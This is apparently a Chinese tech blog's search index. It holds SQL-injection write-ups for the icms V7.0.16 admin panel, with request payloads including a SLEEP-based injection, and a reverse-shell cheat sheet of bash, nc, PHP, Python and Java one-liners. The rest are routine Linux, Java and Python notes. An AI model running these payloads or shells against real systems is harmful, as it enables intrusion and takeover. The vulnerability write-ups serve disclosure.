<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>icms V7.0.16 后台备份数据库sql注入</title>
      <link href="/2023/08/09/icms_backup_sql/"/>
      <url>/2023/08/09/icms_backup_sql/</url>
      
        <content type="html"><![CDATA[<p>1、漏洞位置：后台数据库管理—备份数据库<br> <a data-fancybox="gallery" data-src="https://user-images.githubusercontent.com/37917782/259278595-0dd00bb2-d08a-4cd6-8fd9-b6622ef9f373.png" data-caption="1"><img src="https://user-images.githubusercontent.com/37917782/259278595-0dd00bb2-d08a-4cd6-8fd9-b6622ef9f373.png" alt="1"></a></p><p>2、注入点在267行的$tabledb[],没有单引号保护和进一步的过滤，直接代入数据库查询<br><a data-fancybox="gallery" data-src="https://user-images.githubusercontent.com/37917782/259278627-9ce9b189-8059-4b4a-9021-f21ae3f07725.png" data-caption="2"><img src="https://user-images.githubusercontent.com/37917782/259278627-9ce9b189-8059-4b4a-9021-f21ae3f07725.png" alt="2"></a></p><p>3、后台数据库管理—备份数据库—抓包<br>数据包：</p><p>POST /icms/admincp.php?app=database&amp;do=batch&amp;frame=iPHP&amp;CSRF_TOKEN=147c3ba71iBSwv46u3-S6929ZzoyYEcNomQKbIGgnjUQ-YD1D9onuehUTP0cXFsOl4Zyrwm6-JagBG4gwWvM3RaVf8mQ5WgRhJ98czs HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 54<br>Origin: <a href="http://127.0.0.1/">http://127.0.0.1</a><br>Connection: close<br>Referer: <a href="http://127.0.0.1/icms/admincp.php?app=database&amp;do=backup">http://127.0.0.1/icms/admincp.php?app=database&amp;do=backup</a><br>Cookie: iCMS_ADMIN_AUTH=177606eayar4nMr06uzE8qLtqrHd_-2aqf-LLtx_wGXYxb89E1f5eStc2KHz-r3SJRpcPyesmzEsAwFbpDOBbsXurTZImR75bCQKEo1r_pLLajmwD_2L7Q<br>Upgrade-Insecure-Requests: 1<br>Sec-Fetch-Dest: iframe<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-User: ?1</p><p>table%5B%5D=icms_user_data&amp;sizelimit=2048&amp;batch=backup</p><p>sqlmap进行测试：</p><p><a data-fancybox="gallery" data-src="https://user-images.githubusercontent.com/37917782/259278646-9354dbbb-bed1-40a8-a761-36664a032982.png" data-caption="3"><img src="https://user-images.githubusercontent.com/37917782/259278646-9354dbbb-bed1-40a8-a761-36664a032982.png" alt="3"></a></p><p>测试结果：<br> <a data-fancybox="gallery" data-src="https://user-images.githubusercontent.com/37917782/259278655-b057652f-fb60-46b4-b44a-535c108d0fe2.png" data-caption="4"><img src="https://user-images.githubusercontent.com/37917782/259278655-b057652f-fb60-46b4-b44a-535c108d0fe2.png" alt="4"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>icms V7.0.16 后台数据管理处sql注入</title>
      <link href="/2023/08/01/icms_time_sql/"/>
      <url>/2023/08/01/icms_time_sql/</url>
      
        <content type="html"><![CDATA[<p>1、漏洞出现位置<br> <a data-fancybox="gallery" data-src="https://user-images.githubusercontent.com/37917782/259279133-135d5693-6e8d-48ec-b374-f13333c870cc.png" data-caption="image"><img src="https://user-images.githubusercontent.com/37917782/259279133-135d5693-6e8d-48ec-b374-f13333c870cc.png" alt="image"></a></p><p>2、有问题代码：database.admincp.php中的230行<br> <a data-fancybox="gallery" data-src="https://user-images.githubusercontent.com/37917782/259279155-ed62d7d0-6a10-4416-8534-c5659905f90e.png" data-caption="image"><img src="https://user-images.githubusercontent.com/37917782/259279155-ed62d7d0-6a10-4416-8534-c5659905f90e.png" alt="image"></a></p><p>3、219行传入的where参数，不经过过滤，直接带入230行中的sql执行语句<br> <a data-fancybox="gallery" data-src="https://user-images.githubusercontent.com/37917782/259279168-fa517029-cb77-4c9e-8099-d5da50a7ca1f.png" data-caption="image"><img src="https://user-images.githubusercontent.com/37917782/259279168-fa517029-cb77-4c9e-8099-d5da50a7ca1f.png" alt="image"></a></p><p>4、所以在参数where进行拼接，造成where条件句sql注入，尝试进行手工注入，数据包如下<br>POST /icms/admincp.php?app=database&amp;do=query&amp;frame=iPHP&amp;CSRF_TOKEN=fe334f6fgxSmDHDpZeekNtohnt-hBYXBAOJkd5xXq_XXz5vaYOwEoS_nJrEdZo26EJVC0fA0SkLpfBFFzcE4ly18oxAoBMoCTr22qJ8 HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 108<br>Origin: <a href="http://localhost/">http://localhost</a><br>Connection: close<br>Referer: <a href="http://localhost/icms/admincp.php?app=database&amp;do=replace">http://localhost/icms/admincp.php?app=database&amp;do=replace</a><br>Cookie: iCMS_ADMIN_AUTH=23f0a4caAp2o-gYF7T1PFGTY0fdLZd43ZdGHuQY1NnyOjOUDHZxyC_CewgaX5uR1iNHfEz_Pj20qTaPC_NZlv9CKoxpPtJ80fBz7nbiMensa6tkGlbYrpw; XDEBUG_SESSION=11807<br>Upgrade-Insecure-Requests: 1</p><p>field=tkd&amp;pattern=123123&amp;replacement=1231321&amp;where=where+id=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(10)))testsql)</p><p>5、执行成功，效果如图：<br> <a data-fancybox="gallery" data-src="https://user-images.githubusercontent.com/37917782/259279173-7eeadb88-7c27-4e71-800a-6ee22c6030f7.png" data-caption="image"><img src="https://user-images.githubusercontent.com/37917782/259279173-7eeadb88-7c27-4e71-800a-6ee22c6030f7.png" alt="image"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下本机与远程主机文件传输(命令行)</title>
      <link href="/2022/07/13/Linux%E4%B8%8B%E6%9C%AC%E6%9C%BA%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93-%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
      <url>/2022/07/13/Linux%E4%B8%8B%E6%9C%AC%E6%9C%BA%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93-%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">发送端</span><br><span class="line">$  nc -lvvp 端口 &lt; filename</span><br><span class="line">接收端</span><br><span class="line">$  nc 发送端IP 端口 &gt; filename</span><br></pre></td></tr></table></figure><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">接收端</span><br><span class="line">$ nc -lvvp port | <span class="built_in">base64</span> -di &gt;filename</span><br><span class="line">发送端</span><br><span class="line">$ <span class="built_in">base64</span> file| telnet 接收端ip port</span><br></pre></td></tr></table></figure><h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">发送端</span><br><span class="line">$ nc -lvp port &lt; file</span><br><span class="line">接收端</span><br><span class="line">$ <span class="built_in">cat</span> &lt; /dev/tcp/发送端_ip)/(port) &gt; filename</span><br></pre></td></tr></table></figure><h2 id="方法四-ftp"><a href="#方法四-ftp" class="headerlink" title="方法四:ftp"></a>方法四:ftp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下载单个文件在ftp（sftp）命令行下，运行</span><br><span class="line">$ get &lt;file&gt;   文件会被下载到本地计算机的相同目录下</span><br><span class="line">下载多个文件在ftp（sftp）命令行下，运行</span><br><span class="line">$ mget &lt;file1&gt; &lt;file2&gt; ... &lt;filen&gt;</span><br></pre></td></tr></table></figure><h2 id="方法四-SCP-需要密码"><a href="#方法四-SCP-需要密码" class="headerlink" title="方法四:SCP(需要密码)"></a>方法四:SCP(需要密码)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ scp -v &lt;option&gt; &lt;source_user&gt;@&lt;source_host&gt;:&lt;file&gt; &lt;destination_user&gt;@&lt;destination_host&gt;:&lt;file&gt;</span><br><span class="line">将本地文件从当前机器传输到远程主机（默认情况下，如果您不指定绝对路径，文件将直接复制到您正在连接的用户的主目录。）</span><br><span class="line">$ scp -v file user@192.168.x.x:file</span><br><span class="line">复制目录，您需要指定“-r”选项。</span><br></pre></td></tr></table></figure><h2 id="方法五：rsync-需要密码"><a href="#方法五：rsync-需要密码" class="headerlink" title="方法五：rsync(需要密码)"></a>方法五：rsync(需要密码)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">复制文件：</span><br><span class="line">$ rsync &lt;option&gt; &lt;source_user&gt;@&lt;source_host&gt;:&lt;file&gt; &lt;destination_user&gt;@&lt;destination_host&gt;:&lt;file&gt;</span><br><span class="line">复制目录：</span><br><span class="line">$ rsync -r &lt;source_user&gt;@&lt;source_host&gt;:&lt;file&gt; &lt;destination_user&gt;@&lt;destination_host&gt;:&lt;file&gt;</span><br><span class="line">带有进度条的展示：</span><br><span class="line">$ rsync --progress &lt;source_user&gt;@&lt;source_host&gt;:&lt;file&gt; &lt;destination_user&gt;@&lt;destination_host&gt;:&lt;file&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux 文件传输 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python将字符串转换成字典</title>
      <link href="/2021/05/10/python%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E6%88%90%E5%AD%97%E5%85%B8/"/>
      <url>/2021/05/10/python%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E6%88%90%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="通过literal-eval"><a href="#通过literal-eval" class="headerlink" title="通过literal_eval"></a>通过literal_eval</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">user= <span class="string">&#x27;&#123;&quot;name&quot; : &quot;Mary&quot;, &quot;gender&quot; : &quot;male&quot;, &quot;age&quot;: 20&#125;&#x27;</span></span><br><span class="line">user_dic = ast.literal_eval(user)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(user_dic))</span><br><span class="line"><span class="built_in">print</span>(user_dic)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line"><span class="comment"># &#123;&#x27;name&#x27;: &#x27;Mary&#x27;, &#x27;gender&#x27;: &#x27;male&#x27;, &#x27;age&#x27;: 20&#125;</span></span><br></pre></td></tr></table></figure><p>优点：即不存在json进行转换的单双引号问题，也不存在使用eval进行转换的安全性问题</p><h2 id="通过json来转换"><a href="#通过json来转换" class="headerlink" title="通过json来转换"></a>通过json来转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">user= <span class="string">&#x27;&#123;&quot;name&quot; : &quot;Mary&quot;, &quot;gender&quot; : &quot;male&quot;, &quot;age&quot;: 20&#125;&#x27;</span></span><br><span class="line">user_dic = json.loads(user)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(user_dic))</span><br><span class="line"><span class="built_in">print</span>(user_dic)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line"><span class="comment"># &#123;&#x27;name&#x27;: &#x27;Mary&#x27;, &#x27;gender&#x27;: &#x27;male&#x27;, &#x27;age&#x27;: 20&#125;</span></span><br></pre></td></tr></table></figure><p>优点：安全性尚可</p><p>缺点：json语法规定<strong>数组或对象之中的字符串必须使用双引号，不能使用单引号</strong></p><h2 id="通过eval转换"><a href="#通过eval转换" class="headerlink" title="通过eval转换"></a>通过eval转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user= <span class="string">&#x27;&#123;&quot;name&quot; : &quot;Mary&quot;, &quot;gender&quot; : &quot;male&quot;, &quot;age&quot;: 20&#125;&#x27;</span></span><br><span class="line">user_dic = <span class="built_in">eval</span>(user)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(user_dic))</span><br><span class="line"><span class="built_in">print</span>(user_dic)</span><br></pre></td></tr></table></figure><p>优点：不存在json转换方式中的单双引号问题</p><p>缺点：安全性问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用反弹shell汇总</title>
      <link href="/2021/05/06/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%BC%B9shell%E6%B1%87%E6%80%BB/"/>
      <url>/2021/05/06/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%BC%B9shell%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>以上这种方法可能在一定情况下存在反弹一下就断掉的情况，主要原因是：执行如上代码的话，会把系统的标准输入输出重定向到/bin/sh里，导致php-fpm直接502，然后弹的shell也会瞬间掉了，所以可以采用以下命令进行反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock = fsockopen(&quot;ip&quot;, port);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock,2 =&gt; $sock);$process = proc_open(&quot;/bin/sh&quot;, $descriptorspec, $pipes);proc_close($process);&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;ip&quot;</span>, port);<span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash [ip] [port]</span><br></pre></td></tr></table></figure><h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure><p>通常”/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”进行<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">编码</a>后使用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu下java卸载和安装</title>
      <link href="/2021/04/22/ubuntu%E4%B8%8Bjava%E5%8D%B8%E8%BD%BD%E5%92%8C%E5%AE%89%E8%A3%85/"/>
      <url>/2021/04/22/ubuntu%E4%B8%8Bjava%E5%8D%B8%E8%BD%BD%E5%92%8C%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h4 id="1、解压缩"><a href="#1、解压缩" class="headerlink" title="1、解压缩"></a>1、解压缩</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf jdk-8u181-linux-x64.tar.gz </span><br></pre></td></tr></table></figure><h4 id="2、在-bashrc文件下添加环境变量"><a href="#2、在-bashrc文件下添加环境变量" class="headerlink" title="2、在.bashrc文件下添加环境变量"></a>2、在.bashrc文件下添加环境变量</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=/home/rootz/jdk1.8.0_181/</span><br><span class="line">export JRE_HOME=$JAVA_HOME/jre</span><br><span class="line">export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH</span><br></pre></td></tr></table></figure><h4 id="3、更新源"><a href="#3、更新源" class="headerlink" title="3、更新源"></a>3、更新源</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source</span><br></pre></td></tr></table></figure><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><h4 id="1、先检查是否安装"><a href="#1、先检查是否安装" class="headerlink" title="1、先检查是否安装"></a>1、先检查是否安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sudo) dpkg --list | grep -i jdk</span><br></pre></td></tr></table></figure><h4 id="2、移除openjdk包"><a href="#2、移除openjdk包" class="headerlink" title="2、移除openjdk包"></a>2、移除openjdk包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sudo) apt-get purge openjdk*</span><br></pre></td></tr></table></figure><h4 id="3、卸载openjdk相关包"><a href="#3、卸载openjdk相关包" class="headerlink" title="3、卸载openjdk相关包"></a>3、卸载openjdk相关包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sudo) apt-get purge icedtea-* openjdk-*或者(sudo) apt autoremove icedtea-* openjdk-*</span><br></pre></td></tr></table></figure><h4 id="4、再次检查是否卸载成功"><a href="#4、再次检查是否卸载成功" class="headerlink" title="4、再次检查是否卸载成功"></a>4、再次检查是否卸载成功</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sudo) dpkg --list | grep -i jdk</span><br></pre></td></tr></table></figure><h4 id="5、卸载完成"><a href="#5、卸载完成" class="headerlink" title="5、卸载完成"></a>5、卸载完成</h4>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小问题集锦(持续更新)</title>
      <link href="/2021/04/22/%E5%B0%8F%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
      <url>/2021/04/22/%E5%B0%8F%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="问题1：火狐不能抓127-0-0-1问题"><a href="#问题1：火狐不能抓127-0-0-1问题" class="headerlink" title="问题1：火狐不能抓127.0.0.1问题"></a>问题1：火狐不能抓127.0.0.1问题</h2><p>火狐浏览页中输入about:config，打开配置页；<br>在配置页的搜索栏中搜索network.proxy.allow_hijacking_localhost，<br>找到该配置项，双击设置为true即可。</p><h2 id="问题2：ubuntu安装docker报错"><a href="#问题2：ubuntu安装docker报错" class="headerlink" title="问题2：ubuntu安装docker报错"></a>问题2：ubuntu安装docker报错</h2><p>最好的解决方法就是，安装好ubuntu之后，首先安装docker，如遇到以下问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim : Depends: vim-common (= 2:8.0.1453-1ubuntu1.4) but 2:8.0.1766-1ubuntu1 is to be installed</span><br><span class="line">E: Unable to correct problems, you have held broken packages.</span><br></pre></td></tr></table></figure><p>解决方案即安装对应安装包即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim-common=2:8.0.1453-1ubuntu1.4</span><br></pre></td></tr></table></figure><h2 id="问题3："><a href="#问题3：" class="headerlink" title="问题3："></a>问题3：</h2><p>报错信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)</span><br><span class="line">E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /var/lib/dpkg/lock</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 小问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>argparse库简介</title>
      <link href="/2021/04/16/argparse%E5%BA%93%E7%AE%80%E4%BB%8B/"/>
      <url>/2021/04/16/argparse%E5%BA%93%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考文档：https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser</span></span><br><span class="line"><span class="comment"># 创建一个ArgumentParser对象</span></span><br><span class="line"><span class="comment"># ArgumentParser对象将命令行解析成python数据所需的全部信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># parser = argparse.ArgumentParser(description=&#x27;process some integers.&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加参数</span></span><br><span class="line"><span class="comment"># 给一个ArgumentParser添加程序参数信息是通过调用add_argument方法完成的，通常，这些调用指定ArgumentParser</span></span><br><span class="line"><span class="comment"># 如何获取明明行字符串并将其转换为对象，这些信息再parse_args()调用时被存储和使用，例如</span></span><br><span class="line"><span class="comment"># parser.add_argument(&#x27;integers&#x27;, metavar=&#x27;N&#x27;, type=int, nargs=&#x27;+&#x27;, help=&#x27;an integer for the accumulator&#x27;)</span></span><br><span class="line"><span class="comment"># parser.add_argument(&#x27;--sum&#x27;, dest=&#x27;accumulate&#x27;, action=&#x27;store_const&#x27;, const=sum, default=max,</span></span><br><span class="line"><span class="comment">#                     help=&#x27;sum the integers(default:find the max)&#x27;)</span></span><br><span class="line"><span class="comment"># 调用parse_args()将返回一个具有integers和accumulate两个属性的对象。integers属性将是一个包含一个或多个整数的列表，而accumulate属性</span></span><br><span class="line"><span class="comment"># 当命令行中指定了--sum参数时将是sum()函数，否则则是max()函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析参数</span></span><br><span class="line"><span class="comment"># ArgumentParser通过parse_args()方法解析参数。它将检查命令行，把每个参数转换为适当的类型然后调用响应的操作，在大多数情况下，这意味着</span></span><br><span class="line"><span class="comment"># 一个简单的Namespace对象将从命令行参数中解析出的属性构建：</span></span><br><span class="line"><span class="comment"># args = parser.parse_args()</span></span><br><span class="line"><span class="comment"># 在脚本中，通常parse_args()会被不带参数调用，而ArgumentParser将自动从sys.argv中确定命令行参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ArgumentParser对象</span></span><br><span class="line"><span class="comment"># class argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[],</span></span><br><span class="line"><span class="comment"># formatter_class=argparse.HelpFormatter, prefix_chars=&#x27;-&#x27;, fromfile_prefix_chars=None, argument_default=None,</span></span><br><span class="line"><span class="comment"># conflict_handler=&#x27;error&#x27;, add_help=True, allow_abbrev=True, exit_on_error=True)</span></span><br><span class="line"><span class="comment"># 创建一个新的ArgumentParser 对象，所有的参数都应当作为关键字参数传入。每个参数的描述如下：</span></span><br><span class="line"><span class="comment"># prog-程序的名称（默认是sys.argv[0]）</span></span><br><span class="line"><span class="comment"># usage-描述程序用途的字符串（默认值：从添加到解析器的参数生成）</span></span><br><span class="line"><span class="comment"># 